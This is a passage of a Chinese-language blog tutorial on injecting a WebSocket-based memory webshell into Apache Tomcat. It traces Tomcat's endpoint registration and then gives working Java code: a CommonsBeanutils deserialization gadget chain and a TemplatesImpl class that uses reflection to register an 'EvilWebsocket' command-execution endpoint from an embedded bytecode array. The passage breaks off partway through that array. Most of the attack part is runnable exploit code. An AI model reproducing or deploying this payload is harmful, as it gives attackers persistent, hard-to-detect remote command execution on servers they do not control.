而ServletContainerInitializer的实现者(例如Spring-web中的SpringServletContainerInitializer对接口ServletContainerInitializer的实现中,是可以直接获取到这些类的)</p></li></ol></blockquote><p>大致意思就是说在Tomcat启动的时候，将会对classpath下的jar进行扫描，扫描包中的META-INF&#x2F;services&#x2F;javax.servlet.ServletContainerInitializer文件，对其中提到的类进行加载，调用这个类的onStartup方法。那么我们来看一下tomcat-websocket.jar中的META-INF&#x2F;services&#x2F;javax.servlet.ServletContainerInitializer文件：</p><p><a href="https://pic.imgdb.cn/item/64d26f761ddac507cc092ce8.jpg" title="image-20230803185757146" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f761ddac507cc092ce8.jpg" alt="image-20230803185757146"></a></p><p>接下来我们在org.apache.tomcat.websocket.server.WsSci#onStartup下打断点：</p><p><a href="https://pic.imgdb.cn/item/64d26f841ddac507cc095024.jpg" title="image-20230803185916462" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f841ddac507cc095024.jpg" alt="image-20230803185916462"></a></p><p>首先调用<code>init</code>进行初始化操作WsServerContainer对象，跟进一下init方法：</p><p><a href="https://pic.imgdb.cn/item/64d26f8f1ddac507cc096c47.jpg" title="image-20230804000010834" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f8f1ddac507cc096c47.jpg" alt="image-20230804000010834"></a></p><p>创建了一个WsServerContainer对象sc，参数为servletContext对象。之后调用servletContext的setAttribute()方法，将servletContext的<code>javax.websocket.server.ServerContainer</code>属性设置为sc，并添加了两个listener，一个是WsSessionListener，一个是WsContextListener。添加WsSessionListener的作用是当http的session销毁时同样销毁掉websocket session：</p><p><a href="https://pic.imgdb.cn/item/64d26f9b1ddac507cc09893d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f9b1ddac507cc09893d.jpg"></a></p><p>不过因为我们是注入内存马，只需要了解注册过程即可，并不需要太注意它的作用。之后将一个<code>ServerEndpointConfig</code>对象传给了sc的<code>addEndpoint</code>方法：</p><p><a href="https://pic.imgdb.cn/item/64d26fa71ddac507cc09a55b.jpg" title="image-20230804000414760" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26fa71ddac507cc09a55b.jpg" alt="image-20230804000414760"></a></p><p>跟进一下这个addEndpoint方法，这里获取到 path：</p><p><a href="https://pic.imgdb.cn/item/64d26fc81ddac507cc09f576.jpg" title="image-20230804000617613" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26fc81ddac507cc09f576.jpg" alt="image-20230804000617613"></a></p><p>在取出了其中配置的路由之后生成了一个mapping映射：</p><p><a href="https://pic.imgdb.cn/item/64d26fd21ddac507cc0a1256.jpg" title="image-20230804000745093" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26fd21ddac507cc0a1256.jpg" alt="image-20230804000745093"></a></p><p>接下来总结一下注入流程：</p><p>1.创建一个恶意的Endpoint，实现MessageHandler接口，重写onMessage方法。</p><p>2.为该Endpoint创建ServerEndpointConfig。</p><p>3.获取servletContext的<code>javax.websocket.server.ServerContainer</code>属性得到WsServerContainer</p><p>4.通过<code>WsServerContainer.addEndpoint</code>添加ServerEndpointConfig</p><h4 id="反序列化注入-Tomcat-Websocket-型内存马"><a href="#反序列化注入-Tomcat-Websocket-型内存马" class="headerlink" title="反序列化注入 Tomcat-Websocket 型内存马"></a>反序列化注入 Tomcat-Websocket 型内存马</h4><p>回想一下，我们之前是怎样创建一个恶意的Filter对象或者一个恶意的Servlet对象的？我们是直接让TemplatesImpl对象的_bytecodes字段所对应的那个类实现了Filter接口或Servlet接口，但是现在我们不能继续通过这样的方式来生成一个恶意的Endpoint了。因为这个类必需要继承AbstractTranslet，因此就无法再继承Endpoint了。那我们还有什么办法吗？当然是通过ClassLoader的defineClass来向JVM中注册一个恶意的Endpoint了。我们可以通过<code>Thread.*currentThread*().getContextClassLoader()</code>来获取ClassLoader，之后通过反射的方法，执行defineClass方法，将我们设置好的byte数组转变为java类。具体请看以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(WebsocketTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(EvilWebsocket.class.getName()).toBytecode();</span><br><span class="line">        System.out.println(Arrays.toString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行test2获取到EvilWebsocket类的字节码，之后更改 下面WebsocketTemplatesImpl类中的bytes即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.websocket.server.WsServerContainer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.*;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerContainer;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebsocketTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">urlPath</span> <span class="operator">=</span> <span class="string">&quot;/evilWebsocket&quot;</span>;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改static final</span></span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//静态变量直接填null即可</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">                <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//开始注入内存马</span></span><br><span class="line">                <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                Class clazz;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, -<span class="number">110</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">97</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">107</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">120</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, 